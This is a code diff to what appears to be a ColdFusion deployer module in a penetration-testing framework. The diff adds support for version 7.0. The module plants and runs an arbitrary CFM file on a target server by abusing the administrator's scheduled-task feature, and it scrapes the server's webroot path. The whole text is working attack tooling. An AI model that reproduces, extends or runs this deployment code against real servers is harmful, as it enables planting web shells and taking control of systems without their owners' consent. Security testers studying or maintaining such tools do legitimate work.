@@ -12,7 +12,7 @@ import utility
 
 
 title = CINTERFACES.CFM
-versions = ['8.0', '9.0', '10.0'] # needs testing for older versions
+versions = ['7.0', '8.0', '9.0', '10.0'] # needs testing for older versions
 def deploy(fingerengine, fingerprint):
     """ This is currently a little messy since all major versions
     have slight differences between them.  If 6.x/7.x are significantly
@@ -89,7 +89,7 @@ def create_task(ip, fingerprint, cfm_file, root):
     if fingerprint.version in ["10.0"]:
         data['publish_overwrite'] = 'on'
     
-    if fingerprint.version in ["8.0"]:
+    if fingerprint.version in ["7.0", "8.0"]:
         data['taskNameOrig'] = ""
 
     response = utility.requests_get(url, cookies=cookie)
@@ -112,7 +112,7 @@ def delete_task(ip, fingerprint, cfm_file):
                                                 format(ip, fingerprint.port)
 
     (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
-    if fingerprint.version in ["8.0"]:
+    if fingerprint.version in ["7.0", "8.0"]:
         uri = "?action=delete&task={0}".format(cfm_file)
     elif fingerprint.version in ["9.0"]:
         uri = "?action=delete&task={0}&csrftoken={1}".format(cfm_file, csrf)
@@ -142,7 +142,7 @@ def run_task(ip, fingerprint, cfm_path):
 
     (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
     
-    if fingerprint.version in ["8.0"]:
+    if fingerprint.version in ["7.0", "8.0"]:
         uri = "?runtask={0}&timeout=0".format(cfm_name)
     elif fingerprint.version in ["9.0"]:
         uri = "?runtask={0}&timeout=0&csrftoken={1}".format(cfm_name, csrf)
@@ -203,10 +203,12 @@ def fetch_webroot(ip, fingerprint):
         return False
 
     if req.status_code is 200:
+        
+        root_regex = "CFIDE &nbsp;</td><td scope=row class=\"cellRightAndBottomBlueSide\">(.*?)</td>"
+        if fingerprint.version in ["7.0"]:
+            root_regex = root_regex.replace("scope=row ", "")
 
-        data = findall("CFIDE &nbsp;</td><td scope=row class=\"cellRightAndBottomBlueSide\">(.*?)</td>",
-                            req.content.translate(None, "\n\t\r"))
-
+        data = findall(root_regex, req.content.translate(None, "\n\t\r"))
         if len(data) > 0:
             return data[0].replace("&#x5c;", "\\").replace("&#x3a;", ":")[:-7]
         else:
